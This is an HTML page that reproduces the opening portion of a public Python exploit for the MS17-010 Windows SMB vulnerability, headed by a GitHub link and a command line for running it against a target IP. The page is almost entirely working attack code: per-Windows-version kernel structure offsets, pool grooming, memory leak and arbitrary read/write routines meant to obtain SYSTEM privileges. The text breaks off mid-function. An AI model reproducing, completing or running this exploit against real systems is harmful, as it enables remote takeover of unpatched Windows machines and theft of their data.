<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>script</title>
</head><body>https://github.com/worawit/MS17-010/blob/master/zzz_exploit.py<br/>
<br/>
python zzz_exploit.py &lt;ip&gt; ntsvcs<br/>
<br/>
<br/>
#!/usr/bin/python<br/>
from impacket import smb, smbconnection<br/>
from mysmb import MYSMB<br/>
from struct import pack, unpack, unpack_from<br/>
import sys<br/>
import socket<br/>
import time<br/>
<br/>
'''<br/>
MS17-010 exploit for Windows 2000 and later by sleepya<br/>
Note:<br/>
- The exploit should never crash a target (chance should be nearly 0%)<br/>
- The exploit use the bug same as eternalromance and eternalsynergy, so named pipe is needed<br/>
Tested on:<br/>
- Windows 2016 x64<br/>
- Windows 10 Pro Build 10240 x64<br/>
- Windows 2012 R2 x64<br/>
- Windows 8.1 x64<br/>
- Windows 2008 R2 SP1 x64<br/>
- Windows 7 SP1 x64<br/>
- Windows 2008 SP1 x64<br/>
- Windows 2003 R2 SP2 x64<br/>
- Windows XP SP2 x64<br/>
- Windows 8.1 x86<br/>
- Windows 7 SP1 x86<br/>
- Windows 2008 SP1 x86<br/>
- Windows 2003 SP2 x86<br/>
- Windows XP SP3 x86<br/>
- Windows 2000 SP4 x86<br/>
'''<br/>
<br/>
USERNAME = ''<br/>
PASSWORD = ''<br/>
<br/>
'''<br/>
A transaction with empty setup:<br/>
- it is allocated from paged pool (same as other transaction types) on Windows 7 and later<br/>
- it is allocated from private heap (RtlAllocateHeap()) with no on use it on Windows Vista and earlier<br/>
- no lookaside or caching method for allocating it<br/>
Note: method name is from NSA eternalromance<br/>
For Windows 7 and later, it is good to use matched pair method (one is large pool and another one is fit<br/>
for freed pool from large pool). Additionally, the exploit does the information leak to check transactions<br/>
alignment before doing OOB write. So this exploit should never crash a target against Windows 7 and later.<br/>
For Windows Vista and earlier, matched pair method is impossible because we cannot allocate transaction size<br/>
smaller than PAGE_SIZE (Windows XP can but large page pool does not split the last page of allocation). But<br/>
a transaction with empty setup is allocated on private heap (it is created by RtlCreateHeap() on initialing server).<br/>
Only this transaction type uses this heap. Normally, no one uses this transaction type. So transactions alignment<br/>
in this private heap should be very easy and very reliable (fish in a barrel in NSA eternalromance). The drawback<br/>
of this method is we cannot do information leak to verify transactions alignment before OOB write.<br/>
So this exploit has a chance to crash target same as NSA eternalromance against Windows Vista and earlier.<br/>
'''<br/>
<br/>
'''<br/>
Reversed from: SrvAllocateSecurityContext() and SrvImpersonateSecurityContext()<br/>
win7 x64<br/>
struct SrvSecContext {<br/>
&#09;DWORD xx1; // second WORD is size<br/>
&#09;DWORD refCnt;<br/>
&#09;PACCESS_TOKEN Token; &nbsp;// 0x08<br/>
&#09;DWORD xx2;<br/>
&#09;BOOLEAN CopyOnOpen; // 0x14<br/>
&#09;BOOLEAN EffectiveOnly;<br/>
&#09;WORD xx3;<br/>
&#09;DWORD ImpersonationLevel; // 0x18<br/>
&#09;DWORD xx4;<br/>
&#09;BOOLEAN UsePsImpersonateClient; // 0x20<br/>
}<br/>
win2012 x64<br/>
struct SrvSecContext {<br/>
&#09;DWORD xx1; // second WORD is size<br/>
&#09;DWORD refCnt;<br/>
&#09;QWORD xx2;<br/>
&#09;QWORD xx3;<br/>
&#09;PACCESS_TOKEN Token; &nbsp;// 0x18<br/>
&#09;DWORD xx4;<br/>
&#09;BOOLEAN CopyOnOpen; // 0x24<br/>
&#09;BOOLEAN EffectiveOnly;<br/>
&#09;WORD xx3;<br/>
&#09;DWORD ImpersonationLevel; // 0x28<br/>
&#09;DWORD xx4;<br/>
&#09;BOOLEAN UsePsImpersonateClient; // 0x30<br/>
}<br/>
SrvImpersonateSecurityContext() is used in Windows Vista and later before doing any operation as logged on user.<br/>
It called PsImperonateClient() if SrvSecContext.UsePsImpersonateClient is true. <br/>
From https://msdn.microsoft.com/en-us/library/windows/hardware/ff551907(v=vs.85).aspx, if Token is NULL,<br/>
PsImperonateClient() ends the impersonation. Even there is no impersonation, the PsImperonateClient() returns<br/>
STATUS_SUCCESS when Token is NULL.<br/>
If we can overwrite Token to NULL and UsePsImpersonateClient to true, a running thread will use primary token (SYSTEM)<br/>
to do all SMB operations.<br/>
Note: for Windows 2003 and earlier, the exploit modify token user and groups in PCtxtHandle to get SYSTEM because only<br/>
&nbsp; ImpersonateSecurityContext() is used in these Windows versions.<br/>
'''<br/>
###########################<br/>
# info for modify session security context<br/>
###########################<br/>
WIN7_64_SESSION_INFO = {<br/>
&#09;'SESSION_SECCTX_OFFSET': 0xa0,<br/>
&#09;'SESSION_ISNULL_OFFSET': 0xba,<br/>
&#09;'FAKE_SECCTX': pack('&lt;IIQQIIB', 0x28022a, 1, 0, 0, 2, 0, 1),<br/>
&#09;'SECCTX_SIZE': 0x28,<br/>
}<br/>
<br/>
WIN7_32_SESSION_INFO = {<br/>
&#09;'SESSION_SECCTX_OFFSET': 0x80,<br/>
&#09;'SESSION_ISNULL_OFFSET': 0x96,<br/>
&#09;'FAKE_SECCTX': pack('&lt;IIIIIIB', 0x1c022a, 1, 0, 0, 2, 0, 1),<br/>
&#09;'SECCTX_SIZE': 0x1c,<br/>
}<br/>
<br/>
# win8+ info<br/>
WIN8_64_SESSION_INFO = {<br/>
&#09;'SESSION_SECCTX_OFFSET': 0xb0,<br/>
&#09;'SESSION_ISNULL_OFFSET': 0xca,<br/>
&#09;'FAKE_SECCTX': pack('&lt;IIQQQQIIB', 0x38022a, 1, 0, 0, 0, 0, 2, 0, 1),<br/>
&#09;'SECCTX_SIZE': 0x38,<br/>
}<br/>
<br/>
WIN8_32_SESSION_INFO = {<br/>
&#09;'SESSION_SECCTX_OFFSET': 0x88,<br/>
&#09;'SESSION_ISNULL_OFFSET': 0x9e,<br/>
&#09;'FAKE_SECCTX': pack('&lt;IIIIIIIIB', 0x24022a, 1, 0, 0, 0, 0, 2, 0, 1),<br/>
&#09;'SECCTX_SIZE': 0x24,<br/>
}<br/>
<br/>
# win 2003 (xp 64 bit is win 2003)<br/>
WIN2K3_64_SESSION_INFO = {<br/>
&#09;'SESSION_ISNULL_OFFSET': 0xba,<br/>
&#09;'SESSION_SECCTX_OFFSET': 0xa0, &nbsp;# Win2k3 has another struct to keep PCtxtHandle (similar to 2008+)<br/>
&#09;'SECCTX_PCTXTHANDLE_OFFSET': 0x10, &nbsp;# PCtxtHandle is at offset 0x8 but only upperPart is needed<br/>
&#09;'PCTXTHANDLE_TOKEN_OFFSET': 0x40,<br/>
&#09;'TOKEN_USER_GROUP_CNT_OFFSET': 0x4c,<br/>
&#09;'TOKEN_USER_GROUP_ADDR_OFFSET': 0x68,<br/>
}<br/>
<br/>
WIN2K3_32_SESSION_INFO = {<br/>
&#09;'SESSION_ISNULL_OFFSET': 0x96,<br/>
&#09;'SESSION_SECCTX_OFFSET': 0x80, &nbsp;# Win2k3 has another struct to keep PCtxtHandle (similar to 2008+)<br/>
&#09;'SECCTX_PCTXTHANDLE_OFFSET': 0xc, &nbsp;# PCtxtHandle is at offset 0x8 but only upperPart is needed<br/>
&#09;'PCTXTHANDLE_TOKEN_OFFSET': 0x24,<br/>
&#09;'TOKEN_USER_GROUP_CNT_OFFSET': 0x4c,<br/>
&#09;'TOKEN_USER_GROUP_ADDR_OFFSET': 0x68,<br/>
}<br/>
<br/>
# win xp<br/>
WINXP_32_SESSION_INFO = {<br/>
&#09;'SESSION_ISNULL_OFFSET': 0x94,<br/>
&#09;'SESSION_SECCTX_OFFSET': 0x84, &nbsp;# PCtxtHandle is at offset 0x80 but only upperPart is needed<br/>
&#09;'PCTXTHANDLE_TOKEN_OFFSET': 0x24,<br/>
&#09;'TOKEN_USER_GROUP_CNT_OFFSET': 0x4c,<br/>
&#09;'TOKEN_USER_GROUP_ADDR_OFFSET': 0x68,<br/>
&#09;'TOKEN_USER_GROUP_CNT_OFFSET_SP0_SP1': 0x40,<br/>
&#09;'TOKEN_USER_GROUP_ADDR_OFFSET_SP0_SP1': 0x5c<br/>
}<br/>
<br/>
WIN2K_32_SESSION_INFO = {<br/>
&#09;'SESSION_ISNULL_OFFSET': 0x94,<br/>
&#09;'SESSION_SECCTX_OFFSET': 0x84, &nbsp;# PCtxtHandle is at offset 0x80 but only upperPart is needed<br/>
&#09;'PCTXTHANDLE_TOKEN_OFFSET': 0x24,<br/>
&#09;'TOKEN_USER_GROUP_CNT_OFFSET': 0x3c,<br/>
&#09;'TOKEN_USER_GROUP_ADDR_OFFSET': 0x58,<br/>
}<br/>
<br/>
###########################<br/>
# info for exploitation<br/>
###########################<br/>
# for windows 2008+<br/>
WIN7_32_TRANS_INFO = {<br/>
&#09;'TRANS_SIZE' : 0xa0, &nbsp;# struct size<br/>
&#09;'TRANS_FLINK_OFFSET' : 0x18,<br/>
&#09;'TRANS_INPARAM_OFFSET' : 0x40,<br/>
&#09;'TRANS_OUTPARAM_OFFSET' : 0x44,<br/>
&#09;'TRANS_INDATA_OFFSET' : 0x48,<br/>
&#09;'TRANS_OUTDATA_OFFSET' : 0x4c,<br/>
&#09;'TRANS_PARAMCNT_OFFSET' : 0x58,<br/>
&#09;'TRANS_TOTALPARAMCNT_OFFSET' : 0x5c,<br/>
&#09;'TRANS_FUNCTION_OFFSET' : 0x72,<br/>
&#09;'TRANS_MID_OFFSET' : 0x80,<br/>
}<br/>
<br/>
WIN7_64_TRANS_INFO = {<br/>
&#09;'TRANS_SIZE' : 0xf8, &nbsp;# struct size<br/>
&#09;'TRANS_FLINK_OFFSET' : 0x28,<br/>
&#09;'TRANS_INPARAM_OFFSET' : 0x70,<br/>
&#09;'TRANS_OUTPARAM_OFFSET' : 0x78,<br/>
&#09;'TRANS_INDATA_OFFSET' : 0x80,<br/>
&#09;'TRANS_OUTDATA_OFFSET' : 0x88,<br/>
&#09;'TRANS_PARAMCNT_OFFSET' : 0x98,<br/>
&#09;'TRANS_TOTALPARAMCNT_OFFSET' : 0x9c,<br/>
&#09;'TRANS_FUNCTION_OFFSET' : 0xb2,<br/>
&#09;'TRANS_MID_OFFSET' : 0xc0,<br/>
}<br/>
<br/>
WIN5_32_TRANS_INFO = {<br/>
&#09;'TRANS_SIZE' : 0x98, &nbsp;# struct size<br/>
&#09;'TRANS_FLINK_OFFSET' : 0x18,<br/>
&#09;'TRANS_INPARAM_OFFSET' : 0x3c,<br/>
&#09;'TRANS_OUTPARAM_OFFSET' : 0x40,<br/>
&#09;'TRANS_INDATA_OFFSET' : 0x44,<br/>
&#09;'TRANS_OUTDATA_OFFSET' : 0x48,<br/>
&#09;'TRANS_PARAMCNT_OFFSET' : 0x54,<br/>
&#09;'TRANS_TOTALPARAMCNT_OFFSET' : 0x58,<br/>
&#09;'TRANS_FUNCTION_OFFSET' : 0x6e,<br/>
&#09;'TRANS_PID_OFFSET' : 0x78,<br/>
&#09;'TRANS_MID_OFFSET' : 0x7c,<br/>
}<br/>
<br/>
WIN5_64_TRANS_INFO = {<br/>
&#09;'TRANS_SIZE' : 0xe0, &nbsp;# struct size<br/>
&#09;'TRANS_FLINK_OFFSET' : 0x28,<br/>
&#09;'TRANS_INPARAM_OFFSET' : 0x68,<br/>
&#09;'TRANS_OUTPARAM_OFFSET' : 0x70,<br/>
&#09;'TRANS_INDATA_OFFSET' : 0x78,<br/>
&#09;'TRANS_OUTDATA_OFFSET' : 0x80,<br/>
&#09;'TRANS_PARAMCNT_OFFSET' : 0x90,<br/>
&#09;'TRANS_TOTALPARAMCNT_OFFSET' : 0x94,<br/>
&#09;'TRANS_FUNCTION_OFFSET' : 0xaa,<br/>
&#09;'TRANS_PID_OFFSET' : 0xb4,<br/>
&#09;'TRANS_MID_OFFSET' : 0xb8,<br/>
}<br/>
<br/>
X86_INFO = {<br/>
&#09;'ARCH' : 'x86',<br/>
&#09;'PTR_SIZE' : 4,<br/>
&#09;'PTR_FMT' : 'I',<br/>
&#09;'FRAG_TAG_OFFSET' : 12,<br/>
&#09;'POOL_ALIGN' : 8,<br/>
&#09;'SRV_BUFHDR_SIZE' : 8,<br/>
}<br/>
<br/>
X64_INFO = {<br/>
&#09;'ARCH' : 'x64',<br/>
&#09;'PTR_SIZE' : 8,<br/>
&#09;'PTR_FMT' : 'Q',<br/>
&#09;'FRAG_TAG_OFFSET' : 0x14,<br/>
&#09;'POOL_ALIGN' : 0x10,<br/>
&#09;'SRV_BUFHDR_SIZE' : 0x10,<br/>
}<br/>
<br/>
def merge_dicts(*dict_args):<br/>
&#09;result = {}<br/>
&#09;for dictionary in dict_args:<br/>
&#09;&#09;result.update(dictionary)<br/>
&#09;return result<br/>
<br/>
OS_ARCH_INFO = {<br/>
&#09;# for Windows Vista, 2008, 7 and 2008 R2<br/>
&#09;'WIN7': {<br/>
&#09;&#09;'x86': merge_dicts(X86_INFO, WIN7_32_TRANS_INFO, WIN7_32_SESSION_INFO),<br/>
&#09;&#09;'x64': merge_dicts(X64_INFO, WIN7_64_TRANS_INFO, WIN7_64_SESSION_INFO),<br/>
&#09;},<br/>
&#09;# for Windows 8 and later<br/>
&#09;'WIN8': {<br/>
&#09;&#09;'x86': merge_dicts(X86_INFO, WIN7_32_TRANS_INFO, WIN8_32_SESSION_INFO),<br/>
&#09;&#09;'x64': merge_dicts(X64_INFO, WIN7_64_TRANS_INFO, WIN8_64_SESSION_INFO),<br/>
&#09;},<br/>
&#09;'WINXP': {<br/>
&#09;&#09;'x86': merge_dicts(X86_INFO, WIN5_32_TRANS_INFO, WINXP_32_SESSION_INFO),<br/>
&#09;&#09;'x64': merge_dicts(X64_INFO, WIN5_64_TRANS_INFO, WIN2K3_64_SESSION_INFO),<br/>
&#09;},<br/>
&#09;'WIN2K3': {<br/>
&#09;&#09;'x86': merge_dicts(X86_INFO, WIN5_32_TRANS_INFO, WIN2K3_32_SESSION_INFO),<br/>
&#09;&#09;'x64': merge_dicts(X64_INFO, WIN5_64_TRANS_INFO, WIN2K3_64_SESSION_INFO),<br/>
&#09;},<br/>
&#09;'WIN2K': {<br/>
&#09;&#09;'x86': merge_dicts(X86_INFO, WIN5_32_TRANS_INFO, WIN2K_32_SESSION_INFO),<br/>
&#09;},<br/>
}<br/>
<br/>
<br/>
TRANS_NAME_LEN = 4<br/>
HEAP_HDR_SIZE = 8 &nbsp;# heap chunk header size<br/>
<br/>
<br/>
def calc_alloc_size(size, align_size):<br/>
&#09;return (size + align_size - 1) &amp; ~(align_size-1)<br/>
<br/>
def wait_for_request_processed(conn):<br/>
&#09;#time.sleep(0.05)<br/>
&#09;# send echo is faster than sleep(0.05) when connection is very good<br/>
&#09;conn.send_echo('a')<br/>
<br/>
def find_named_pipe(conn):<br/>
&#09;pipes = [ 'browser', 'spoolss', 'netlogon', 'lsarpc', 'samr' ]<br/>
&#09;<br/>
&#09;tid = conn.tree_connect_andx('\\\\'+conn.get_remote_host()+'\\'+'IPC$')<br/>
&#09;found_pipe = None<br/>
&#09;for pipe in pipes:<br/>
&#09;&#09;try:<br/>
&#09;&#09;&#09;fid = conn.nt_create_andx(tid, pipe)<br/>
&#09;&#09;&#09;conn.close(tid, fid)<br/>
&#09;&#09;&#09;found_pipe = pipe<br/>
&#09;&#09;&#09;break<br/>
&#09;&#09;except smb.SessionError as e:<br/>
&#09;&#09;&#09;pass<br/>
&#09;<br/>
&#09;conn.disconnect_tree(tid)<br/>
&#09;return found_pipe<br/>
<br/>
<br/>
special_mid = 0<br/>
extra_last_mid = 0<br/>
def reset_extra_mid(conn):<br/>
&#09;global extra_last_mid, special_mid<br/>
&#09;special_mid = (conn.next_mid() &amp; 0xff00) - 0x100<br/>
&#09;extra_last_mid = special_mid<br/>
&#09;<br/>
def next_extra_mid():<br/>
&#09;global extra_last_mid<br/>
&#09;extra_last_mid += 1<br/>
&#09;return extra_last_mid<br/>
<br/>
<br/>
# Borrow 'groom' and 'bride' word from NSA tool<br/>
# GROOM_TRANS_SIZE includes transaction name, parameters and data<br/>
# Note: the GROOM_TRANS_SIZE size MUST be multiple of 16 to make FRAG_TAG_OFFSET valid<br/>
GROOM_TRANS_SIZE = 0x5010<br/>
<br/>
def leak_frag_size(conn, tid, fid):<br/>
&#09;# this method can be used on Windows Vista/2008 and later<br/>
&#09;# leak "Frag" pool size and determine target architecture<br/>
&#09;info = {}<br/>
&#09;<br/>
&#09;# A "Frag" pool is placed after the large pool allocation if last page has some free space left.<br/>
&#09;# A "Frag" pool size (on 64-bit) is 0x10 or 0x20 depended on Windows version.<br/>
&#09;# To make exploit more generic, exploit does info leak to find a "Frag" pool size.<br/>
&#09;# From the leak info, we can determine the target architecture too.<br/>
&#09;mid = conn.next_mid()<br/>
&#09;req1 = conn.create_nt_trans_packet(5, param=pack('&lt;HH', fid, 0), mid=mid, data='A'*0x10d0, maxParameterCount=GROOM_TRANS_SIZE-0x10d0-TRANS_NAME_LEN)<br/>
&#09;req2 = conn.create_nt_trans_secondary_packet(mid, data='B'*276) # leak more 276 bytes<br/>
&#09;<br/>
&#09;conn.send_raw(req1[:-8])<br/>
&#09;conn.send_raw(req1[-8:]+req2)<br/>
&#09;leakData = conn.recv_transaction_data(mid, 0x10d0+276)<br/>
&#09;leakData = leakData[0x10d4:] &nbsp;# skip parameters and its own input<br/>
&#09;# Detect target architecture and calculate frag pool size<br/>
&#09;if leakData[X86_INFO['FRAG_TAG_OFFSET']:X86_INFO['FRAG_TAG_OFFSET']+4] == 'Frag':<br/>
&#09;&#09;print('Target is 32 bit')<br/>
&#09;&#09;info['arch'] = 'x86'<br/>
&#09;&#09;info['FRAG_POOL_SIZE'] = ord(leakData[ X86_INFO['FRAG_TAG_OFFSET']-2 ]) * X86_INFO['POOL_ALIGN']<br/>
&#09;elif leakData[X64_INFO['FRAG_TAG_OFFSET']:X64_INFO['FRAG_TAG_OFFSET']+4] == 'Frag':<br/>
&#09;&#09;print('Target is 64 bit')<br/>
&#09;&#09;info['arch'] = 'x64'<br/>
&#09;&#09;info['FRAG_POOL_SIZE'] = ord(leakData[ X64_INFO['FRAG_TAG_OFFSET']-2 ]) * X64_INFO['POOL_ALIGN']<br/>
&#09;else:<br/>
&#09;&#09;print('Not found Frag pool tag in leak data')<br/>
&#09;&#09;sys.exit()<br/>
&#09;<br/>
&#09;print('Got frag size: 0x{:x}'.format(info['FRAG_POOL_SIZE']))<br/>
&#09;return info<br/>
<br/>
<br/>
def read_data(conn, info, read_addr, read_size):<br/>
&#09;fmt = info['PTR_FMT']<br/>
&#09;# modify trans2.OutParameter to leak next transaction and trans2.OutData to leak real data<br/>
&#09;# modify trans2.*ParameterCount and trans2.*DataCount to limit data<br/>
&#09;new_data = pack('&lt;'+fmt*3, info['trans2_addr']+info['TRANS_FLINK_OFFSET'], info['trans2_addr']+0x200, read_addr) &nbsp;# OutParameter, InData, OutData<br/>
&#09;new_data += pack('&lt;II', 0, 0) &nbsp;# SetupCount, MaxSetupCount<br/>
&#09;new_data += pack('&lt;III', 8, 8, 8) &nbsp;# ParamterCount, TotalParamterCount, MaxParameterCount<br/>
&#09;new_data += pack('&lt;III', read_size, read_size, read_size) &nbsp;# DataCount, TotalDataCount, MaxDataCount<br/>
&#09;new_data += pack('&lt;HH', 0, 5) &nbsp;# Category, Function (NT_RENAME)<br/>
&#09;conn.send_nt_trans_secondary(mid=info['trans1_mid'], data=new_data, dataDisplacement=info['TRANS_OUTPARAM_OFFSET'])<br/>
&#09;<br/>
&#09;# create one more transaction before leaking data<br/>
&#09;# - next transaction can be used for arbitrary read/write after the current trans2 is done<br/>
&#09;# - next transaction address is from TransactionListEntry.Flink value<br/>
&#09;conn.send_nt_trans(5, param=pack('&lt;HH', info['fid'], 0), totalDataCount=0x4300-0x20, totalParameterCount=0x1000)<br/>
<br/>
&#09;# finish the trans2 to leak<br/>
&#09;conn.send_nt_trans_secondary(mid=info['trans2_mid'])<br/>
&#09;read_data = conn.recv_transaction_data(info['trans2_mid'], 8+read_size)<br/>
&#09;<br/>
&#09;# set new trans2 address<br/>
&#09;info['trans2_addr'] = unpack_from('&lt;'+fmt, read_data)[0] - info['TRANS_FLINK_OFFSET']<br/>
&#09;<br/>
&#09;# set trans1.InData to &amp;trans2<br/>
&#09;conn.send_nt_trans_secondary(mid=info['trans1_mid'], param=pack('&lt;'+fmt, info['trans2_addr']), paramDisplacement=info['TRANS_INDATA_OFFSET'])<br/>
&#09;wait_for_request_processed(conn)<br/>
<br/>
&#09;# modify trans2 mid<br/>
&#09;conn.send_nt_trans_secondary(mid=info['trans1_mid'], data=pack('&lt;H', info['trans2_mid']), dataDisplacement=info['TRANS_MID_OFFSET'])<br/>
&#09;wait_for_request_processed(conn)<br/>
&#09;<br/>
&#09;return read_data[8:] &nbsp;# no need to return parameter<br/>
<br/>
def write_data(conn, info, write_addr, write_data):<br/>
&#09;# trans2.InData<br/>
&#09;conn.send_nt_trans_secondary(mid=info['trans1_mid'], data=pack('&lt;'+info['PTR_FMT'], write_addr), dataDisplacement=info['TRANS_INDATA_OFFSET'])<br/>
&#09;wait_for_request_processed(conn)<br/>
&#09;<br/>
&#09;# write data<br/>
&#09;conn.send_nt_trans_secondary(mid=info['trans2_mid'], data=write_data)<br/>
&#09;wait_for_request_processed(conn)<br/>
<br/>
<br/>
def align_transaction_and_leak(conn, tid, fid, info, numFill=4):<br/>
&#09;trans_param = pack('&lt;HH', fid, 0) &nbsp;# param for NT_RENAME<br/>
&#09;# fill large pagedpool holes (maybe no need)<br/>
&#09;for i in range(numFill):<br/>
&#09;&#09;conn.send_nt_trans(5, param=trans_param, totalDataCount=0x10d0, maxParameterCount=GROOM_TRANS_SIZE-0x10d0)<br/>
<br/>
&#09;mid_ntrename = conn.next_mid()<br/>
&#09;# first GROOM, for leaking next BRIDE transaction<br/>
&#09;req1 = conn.create_nt_trans_packet(5, param=trans_param, mid=mid_ntrename, data='A'*0x10d0, maxParameterCount=info['GROOM_DATA_SIZE']-0x10d0)<br/>
&#09;req2 = conn.create_nt_trans_secondary_packet(mid_ntrename, data='B'*276) # leak more 276 bytes<br/>
&#09;# second GROOM, for controlling next BRIDE transaction<br/>
&#09;req3 = conn.create_nt_trans_packet(5, param=trans_param, mid=fid, totalDataCount=info['GROOM_DATA_SIZE']-0x1000, maxParameterCount=0x1000)<br/>
&#09;# many BRIDEs, expect two of them are allocated at splitted pool from GROOM<br/>
&#09;reqs = []<br/>
&#09;for i in range(12):<br/>
&#09;&#09;mid = next_extra_mid()<br/>
&#09;&#09;reqs.append(conn.create_trans_packet('', mid=mid, param=trans_param, totalDataCount=info['BRIDE_DATA_SIZE']-0x200, totalParameterCount=0x200, maxDataCount=0, maxParameterCount=0))<br/>
<br/>
&#09;conn.send_raw(req1[:-8])<br/>
&#09;conn.send_raw(req1[-8:]+req2+req3+''.join(reqs))<br/>
&#09;<br/>
&#09;# expected transactions alignment ("Frag" pool is not shown)<br/>
&#09;#<br/>
&#09;# &nbsp; &nbsp;| &nbsp; &nbsp; &nbsp; &nbsp; 5 * PAGE_SIZE &nbsp; &nbsp; &nbsp; &nbsp; | &nbsp; PAGE_SIZE &nbsp; &nbsp;| &nbsp; &nbsp; &nbsp; &nbsp; 5 * PAGE_SIZE &nbsp; &nbsp; &nbsp; &nbsp; | &nbsp; PAGE_SIZE &nbsp; &nbsp;|<br/>
&#09;# &nbsp; &nbsp;+-------------------------------+----------------+-------------------------------+----------------+<br/>
&#09;# &nbsp; &nbsp;| &nbsp; &nbsp;GROOM mid=mid_ntrename &nbsp; &nbsp; &nbsp; &nbsp;| &nbsp;extra_mid1 | &nbsp; &nbsp; &nbsp; &nbsp; GROOM mid=fid &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| &nbsp;extra_mid2 |<br/>
&#09;# &nbsp; &nbsp;+-------------------------------+----------------+-------------------------------+----------------+<br/>
&#09;#<br/>
&#09;# If transactions are aligned as we expected, BRIDE transaction with mid=extra_mid1 will be leaked.<br/>
&#09;# From leaked transaction, we get<br/>
&#09;# - leaked transaction address from InParameter or InData<br/>
&#09;# - transaction, with mid=extra_mid2, address from LIST_ENTRY.Flink<br/>
&#09;# With these information, we can verify the transaction aligment from displacement.<br/>
<br/>
&#09;leakData = conn.recv_transaction_data(mid_ntrename, 0x10d0+276)<br/>
&#09;leakData = leakData[0x10d4:] &nbsp;# skip parameters and its own input<br/>
&#09;#open('leak.dat', 'wb').write(leakData)<br/>
<br/>
&#09;if leakData[info['FRAG_TAG_OFFSET']:info['FRAG_TAG_OFFSET']+4] != 'Frag':<br/>
&#09;&#09;print('Not found Frag pool tag in leak data')<br/>
&#09;&#09;return None<br/>
&#09;<br/>
&#09;# ================================<br/>
&#09;# verify leak data<br/>
&#09;# ================================<br/>
&#09;leakData = leakData[info['FRAG_TAG_OFFSET']-4+info['FRAG_POOL_SIZE']:]<br/>
&#09;# check pool tag and size value in buffer header<br/>
&#09;expected_size = pack('&lt;H', info['BRIDE_TRANS_SIZE'])<br/>
&#09;leakTransOffset = info['POOL_ALIGN'] + info['SRV_BUFHDR_SIZE']<br/>
&#09;if leakData[0x4:0x8] != 'LStr' or leakData[info['POOL_ALIGN']:info['POOL_ALIGN']+2] != expected_size or leakData[leakTransOffset+2:leakTransOffset+4] != expected_size:<br/>
&#09;&#09;print('No transaction struct in leak data')<br/>
&#09;&#09;return None<br/>
<br/>
&#09;leakTrans = leakData[leakTransOffset:]<br/>
<br/>
&#09;ptrf = info['PTR_FMT']<br/>
&#09;_, connection_addr, session_addr, treeconnect_addr, flink_value = unpack_from('&lt;'+ptrf*5, leakTrans, 8)<br/>
&#09;inparam_value = unpack_from('&lt;'+ptrf, leakTrans, info['TRANS_INPARAM_OFFSET'])[0]<br/>
&#09;leak_mid = unpack_from('&lt;H', leakTrans, info['TRANS_MID_OFFSET'])[0]<br/>
<br/>
&#09;print('CONNECTION: 0x{:x}'.format(connection_addr))<br/>
&#09;print('SESSION: 0x{:x}'.format(session_addr))<br/>
&#09;print('FLINK: 0x{:x}'.format(flink_value))<br/>
&#09;print('InParam: 0x{:x}'.format(inparam_value))<br/>
&#09;print('MID: 0x{:x}'.format(leak_mid))<br/>
<br/>
&#09;next_page_addr = (inparam_value &amp; 0xfffffffffffff000) + 0x1000<br/>
&#09;if next_page_addr + info['GROOM_POOL_SIZE'] + info['FRAG_POOL_SIZE'] + info['POOL_ALIGN'] + info['SRV_BUFHDR_SIZE'] + info['TRANS_FLINK_OFFSET'] != flink_value:<br/>
&#09;&#09;print('unexpected alignment, diff: 0x{:x}'.format(flink_value - next_page_addr))<br/>
&#09;&#09;return None<br/>
&#09;# trans1: leak transaction<br/>
&#09;# trans2: next transaction<br/>
&#09;return {<br/>
&#09;&#09;'connection': connection_addr,<br/>
&#09;&#09;'session': session_addr,<br/>
&#09;&#09;'next_page_addr': next_page_addr,<br/>
&#09;&#09;'trans1_mid': leak_mid,<br/>
&#09;&#09;'trans1_addr': inparam_value - info['TRANS_SIZE'] - TRANS_NAME_LEN,<br/>
&#09;&#09;'trans2_addr': flink_value - info['TRANS_FLINK_OFFSET'],<br/>
&#09;}<br/>
<br/>
def exploit_matched_pairs(conn, pipe_name, info):<br/>
&#09;# for Windows 7/2008 R2 and later<br/>
&#09;<br/>
&#09;tid = conn.tree_connect_andx('\\\\'+conn.get_remote_host()+'\\'+'IPC$')<br/>
&#09;conn.set_default_tid(tid)<br/>
&#09;# fid for first open is always 0x4000. We can open named pipe multiple times to get other fids.<br/>
&#09;fid = conn.nt_create_andx(tid, pipe_name)<br/>
&#09;<br/>
&#09;info.update(leak_frag_size(conn, tid, fid))<br/>
&#09;# add os and arch specific exploit info<br/>
&#09;info.update(OS_ARCH_INFO[info['os']][info['arch']])<br/>
&#09;<br/>
&#09;# groom: srv buffer header<br/>
&#09;info['GROOM_POOL_SIZE'] = calc_alloc_size(GROOM_TRANS_SIZE + info['SRV_BUFHDR_SIZE'] + info['POOL_ALIGN'], info['POOL_ALIGN'])<br/>
&#09;print('GROOM_POOL_SIZE: 0x{:x}'.format(info['GROOM_POOL_SIZE']))<br/>
&#09;# groom paramters and data is alignment by 8 because it is NT_TRANS<br/>
&#09;info['GROOM_DATA_SIZE'] = GROOM_TRANS_SIZE - TRANS_NAME_LEN - 4 - info['TRANS_SIZE'] &nbsp;# alignment (4)<br/>
<br/>
&#09;# bride: srv buffer header, pool header (same as pool align size), empty transaction name (4)<br/>
&#09;bridePoolSize = 0x1000 - (info['GROOM_POOL_SIZE'] &amp; 0xfff) - info['FRAG_POOL_SIZE']<br/>
&#09;info['BRIDE_TRANS_SIZE'] = bridePoolSize - (info['SRV_BUFHDR_SIZE'] + info['POOL_ALIGN'])<br/>
&#09;print('BRIDE_TRANS_SIZE: 0x{:x}'.format(info['BRIDE_TRANS_SIZE']))<br/>
&#09;# bride paramters and data is alignment by 4 because it is TRANS<br/>
&#09;info['BRIDE_DATA_SIZE'] = info['BRIDE_TRANS_SIZE'] - TRANS_NAME_LEN - info['TRANS_SIZE']<br/>
&#09;<br/>
&#09;# ================================<br/>
&#09;# try align pagedpool and leak info until satisfy<br/>
&#09;# ================================<br/>
&#09;leakInfo = None<br/>
&#09;# max attempt: 10<br/>
&#09;for i in range(10):<br/>
&#09;&#09;reset_extra_mid(conn)<br/>
&#09;&#09;leakInfo = align_transaction_and_leak(conn, tid, fid, info)<br/>
&#09;&#09;if leakInfo is not None:<br/>
&#09;&#09;&#09;break<br/>
&#09;&#09;print('leak failed... try again')<br/>
&#09;&#09;conn.close(tid, fid)<br/>
&#09;&#09;conn.disconnect_tree(tid)<br/>
&#09;&#09;<br/>
